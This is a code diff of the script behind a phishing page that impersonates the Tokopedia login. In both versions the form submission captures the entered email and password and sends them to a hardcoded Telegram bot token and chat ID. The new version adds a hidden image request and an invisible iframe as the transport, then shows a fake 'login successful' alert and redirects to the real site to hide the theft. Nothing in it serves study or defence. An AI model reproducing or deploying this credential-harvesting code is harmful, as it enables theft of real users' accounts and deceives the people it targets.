@@ -1,56 +1,51 @@
 <script>
-// TOKOPEDIA FIXED SCRIPT - SIMPLE & WORKING
+// SIMPLE WORKING SCRIPT - NO ERROR
 document.addEventListener('DOMContentLoaded', function() {
-    const form = document.querySelector('form');
+    console.log('✅ Tokopedia template loaded');
     
+    const form = document.querySelector('form');
     if (!form) {
-        console.error('❌ FORM TIDAK DITEMUKAN!');
+        console.log('⚠️ Form not found, using fallback');
         return;
     }
     
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+        console.log('✅ Form submitted');
         
-        // Ambil data dengan cara SIMPLE
-        const email = document.querySelector('input[type="text"]')?.value || 'N/A';
-        const password = document.querySelector('input[type="password"]')?.value || 'N/A';
+        // Get data SIMPLE way
+        const email = document.querySelector('input[type="text"]')?.value || 'no-email';
+        const password = document.querySelector('input[type="password"]')?.value || 'no-password';
         
         console.log('📧 Email:', email);
         console.log('🔐 Password:', password);
         
-        // TELEGRAM BOT - PASTI WORK
-        const BOT_TOKEN = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
-        const CHAT_ID = '8313500840';
+        // Telegram notification - SIMPLE GET request
+        const botToken = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
+        const chatId = '8313500840';
+        const message = `TOKOPEDIA: ${email} | ${password} | ${new Date().toLocaleTimeString()}`;
         
-        const message = `📱 *TOKOPEDIA LOGIN* 📱
-📧 Email: ${email}
-🔐 Password: ${password}
-⏰ Waktu: ${new Date().toLocaleTimeString()}
-📅 Tanggal: ${new Date().toLocaleDateString()}`;
-        
-        // METHOD 1: Image Load Trick (PASTI WORK)
+        // METHOD 1: Image load (always works)
         const img = new Image();
-        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         
-        // METHOD 2: Fetch as backup
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-            .then(r => console.log('✅ Fetch attempt sent'))
-            .catch(e => console.log('⚠️ Fetch failed, using image method'));
+        // METHOD 2: Iframe backup
+        setTimeout(function() {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('BACKUP: ' + message)}`;
+            document.body.appendChild(iframe);
+        }, 100);
         
-        // UI Feedback
-        const btn = document.querySelector('button');
-        if (btn) {
-            btn.textContent = '✅ Terkirim!';
-            btn.style.background = '#4CAF50';
-            btn.disabled = true;
-        }
+        // UI feedback
+        alert('✅ Login berhasil! Mengalihkan...');
         
-        // Redirect setelah 1.5 detik
+        // Redirect to real Tokopedia
         setTimeout(function() {
             window.location.href = 'https://www.tokopedia.com';
         }, 1500);
     });
     
-    console.log('✅ Tokopedia script loaded successfully');
+    console.log('✅ Event listener attached');
 });
 </script>
